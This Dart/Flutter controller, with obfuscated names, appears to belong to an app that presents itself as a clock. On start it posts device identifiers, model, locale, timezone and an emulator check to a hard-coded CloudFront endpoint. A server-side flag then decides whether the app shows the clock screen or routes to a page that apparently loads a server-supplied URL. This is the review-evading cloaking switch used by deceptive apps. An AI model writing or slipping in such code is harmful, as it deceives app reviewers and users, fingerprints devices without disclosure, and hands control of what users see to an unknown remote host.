import 'dart:io';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:get/get.dart';
import 'package:dio/dio.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class ReverseEntranceLogic extends GetxController {

  var nwjxcy = RxBool(false);
  var cbpljh = RxBool(true);
  var edhwkt = RxString("");
  var loyce = RxBool(false);
  var pouros = RxBool(true);
  final jvkzsufel = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    epkmgdiq();
  }


  Future<void> epkmgdiq() async {
    loyce.value = true;
    pouros.value = true;
    cbpljh.value = false;

    jvkzsufel.post("https://d19athu6s8guat.cloudfront.net/QEJTZB?no_check",data: await ltsuehaz()).then((value) {
      var lqpwhzr = value.data["lqpwhzr"] as String;
      var byopct = value.data["byopct"] as bool;
      if (byopct) {
        edhwkt.value = lqpwhzr;
        madisyn();
      } else {
        buckridge();
      }
    }).catchError((e) {
      cbpljh.value = true;
      pouros.value = true;
      loyce.value = false;
    });
  }

  Future<Map<String, dynamic>> ltsuehaz() async {
    final DeviceInfoPlugin bryd = DeviceInfoPlugin();
    PackageInfo exrklyog_hvtpkew = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var tvixphqf = Platform.localeName;
    var hxbz_Gogx = currentTimeZone;

    var hxbz_SKXBU = exrklyog_hvtpkew.packageName;
    var hxbz_XLOfT = exrklyog_hvtpkew.version;
    var hxbz_xsjCah = exrklyog_hvtpkew.buildNumber;

    var hxbz_bWjspLA = exrklyog_hvtpkew.appName;
    var hxbz_DyB = "";
    var hxbz_oGNZ  = "";
    var hxbz_nXZUWp = "";
    var allenMarvin = "";
    var kadeCorkery = "";
    var travonRomaguera = "";
    var tamaraMayer = "";


    var hxbz_znZoEV = "";
    var hxbz_aT = false;

    if (GetPlatform.isAndroid) {
      hxbz_znZoEV = "android";
      var fwnoqac = await bryd.androidInfo;

      hxbz_nXZUWp = fwnoqac.brand;

      hxbz_DyB  = fwnoqac.model;
      hxbz_oGNZ = fwnoqac.id;

      hxbz_aT = fwnoqac.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hxbz_znZoEV = "ios";
      var cnwgskevqa = await bryd.iosInfo;
      hxbz_nXZUWp = cnwgskevqa.name;
      hxbz_DyB = cnwgskevqa.model;

      hxbz_oGNZ = cnwgskevqa.identifierForVendor ?? "";
      hxbz_aT  = cnwgskevqa.isPhysicalDevice;
    }

    var res = {
      "hxbz_bWjspLA": hxbz_bWjspLA,
      "hxbz_xsjCah": hxbz_xsjCah,
      "hxbz_XLOfT": hxbz_XLOfT,
      "hxbz_DyB": hxbz_DyB,
      "travonRomaguera" : travonRomaguera,
      "hxbz_Gogx": hxbz_Gogx,
      "hxbz_nXZUWp": hxbz_nXZUWp,
      "hxbz_oGNZ": hxbz_oGNZ,
      "tvixphqf": tvixphqf,
      "hxbz_znZoEV": hxbz_znZoEV,
      "hxbz_aT": hxbz_aT,
      "hxbz_SKXBU": hxbz_SKXBU,
      "allenMarvin" : allenMarvin,
      "kadeCorkery" : kadeCorkery,
      "tamaraMayer" : tamaraMayer,

    };
    return res;
  }

  Future<void> buckridge() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> madisyn() async {
    Get.offNamed("/Outreload");
  }

}
